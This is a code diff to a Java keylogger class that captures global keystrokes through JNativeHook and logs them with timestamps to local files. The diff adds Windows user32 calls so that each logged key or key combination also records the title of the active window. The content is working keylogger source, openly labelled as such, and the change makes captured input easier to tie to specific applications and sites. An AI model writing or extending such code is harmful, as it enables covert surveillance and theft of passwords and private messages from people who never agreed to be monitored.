@@ -1,5 +1,9 @@
 package khushi;
 
+import com.sun.jna.Native;
+import com.sun.jna.platform.win32.WinDef.HWND;
+import com.sun.jna.win32.StdCallLibrary;
+
 import com.github.kwhat.jnativehook.GlobalScreen;
 import com.github.kwhat.jnativehook.NativeHookException;
 import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
@@ -15,12 +19,22 @@ import java.util.Set;
 
 public class Keylogger implements NativeKeyListener
 {
+
     private static final String DIRECTORY_PATH = "logs/";
     private static final String DATE_TIME_FORMAT = "yyyy-MM-dd-HH-mm-ss";
     private static final String LOG_TIME_FORMAT = "yyyy-MM-dd HH:mm:ss";
 
     private final FileWriter output;
     private final Set<String> currentlyPressedKeys = new HashSet<>();
+
+    interface User32 extends StdCallLibrary
+    {
+        User32 INSTANCE = (User32) Native.load("user32", User32.class);
+
+        int GetWindowTextA(HWND hwnd, byte[] lpString, int nMaxCount);
+
+        HWND GetForegroundWindow();
+    }
 
     public Keylogger()
     {
@@ -83,19 +97,28 @@ public class Keylogger implements NativeKeyListener
     private void logKeyPressedEvent(String keyText)
     {
         String dateTime = getCurrentDateTime(LOG_TIME_FORMAT);
+        String activeWindowTitle = getActiveWindowTitle();
         String logText;
 
         if (currentlyPressedKeys.size() > 1)
         {
             logText = dateTime + " - Combination of keys: " + String.join(" + ", currentlyPressedKeys)
-                    + " has been pressed.";
+                    + " has been pressed. Active Window: " + activeWindowTitle;
         } else
         {
-            logText = dateTime + " - Pressed this key: " + keyText;
+            logText = dateTime + " - Pressed this key: " + keyText + ". Active Window: " + activeWindowTitle;
         }
 
         System.out.println(logText);
         writeToFile(logText + "\n");
+    }
+
+    private String getActiveWindowTitle()
+    {
+        byte[] buffer = new byte[1024];
+        HWND hwnd = User32.INSTANCE.GetForegroundWindow();
+        User32.INSTANCE.GetWindowTextA(hwnd, buffer, 1024);
+        return Native.toString(buffer);
     }
 
     private void writeToFile(String text)
